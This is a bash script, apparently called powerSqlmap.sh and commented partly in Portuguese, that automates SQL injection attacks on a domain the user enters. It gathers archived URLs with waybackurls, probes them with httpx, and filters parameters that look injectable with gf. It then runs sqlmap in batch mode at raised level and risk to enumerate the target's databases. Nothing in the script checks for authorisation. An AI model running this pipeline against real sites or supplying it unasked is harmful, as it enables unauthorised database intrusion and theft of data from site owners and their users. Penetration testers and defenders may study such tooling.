#!/bin/bash

# Arte de introdução
tput bold; echo "
__________          __      __                   _________        .__                             
\______   \  ____  /  \    /  \  ____  _______  /   _____/  ______|  |    _____  _____   ______  
 |     ___/ /  _ \ \   \/\/   /_/ __ \ \_  __ \ \_____  \  / ____/|  |   /     \ \__  \  \____ \ 
 |    |    (  <_> ) \        / \  ___/  |  | \/ /        \< <_|  ||  |__|  Y Y  \ / __ \_|  |_> >
 |____|     \____/   \__/\  /   \___  > |__|   /_______  / \__   ||____/|__|_|  /(____  /|   __/ 
                          \/        \/                 \/     |__|            \/      \/ |__|     
" | lolcat

# Check if the user is connected to the internet
tput bold; echo "[+]CHECKING IF YOU ARE CONNECTED TO THE INTERNET......." | lolcat

# Check connection
wget -q --spider https://google.com
if [ $? -ne 0 ]; then
    echo "[+]CONNECT TO THE INTERNET BEFORE RUNNING powerSqlmap.sh!......." | lolcat
    exit 1
fi

tput bold; echo "[+]CONNECTION FOUND, LET'S GO!............" | lolcat

# Get domain name from user input
echo "Enter Domain:"
read domain

# Create a directory with the domain name of the website
echo "[+]Creating directory for output files..."
mkdir -p "$domain"

# Fetching URLs for website and filtering by specific extensions, please wait...
echo "[+]Fetching URLs for $domain and filtering by specific extensions..."
waybackurls "$domain" | tee "$domain/filtered_urls.txt" | lolcat

# Checking filtered URLs with httpx and saving the output in httpx_output.txt...
echo "[+]Checking filtered URLs with httpx and saving the output in httpx_output.txt..."
cat "$domain/filtered_urls.txt" | httpx --silent | tee "$domain/httpx_output.txt" | lolcat

total_filtered_urls=$(grep -c '^' "$domain/httpx_output.txt")
echo "[+]Total de URLs filtradas: $total_filtered_urls" | lolcat

# Passo 4: Filtrar URLs com parâmetros para SQL Injection
echo "[*] Filtrando possíveis SQL Injection..."
cat "$domain/httpx_output.txt" | gf sqli > "$domain/sqli.txt"

# Verifica se encontrou URLs para testar
if [ ! -s "$domain/sqli.txt" ]; then
    echo "[!] Nenhuma URL vulnerável encontrada com parâmetros SQL Injection."
    exit 1
fi

# Passo 5: Rodar SQLMap
echo "[*] Iniciando SQLMap..."
sqlmap -m "$domain/sqli.txt" --dbs --batch --level 3 --risk 2 --time-sec 10 --random-agent
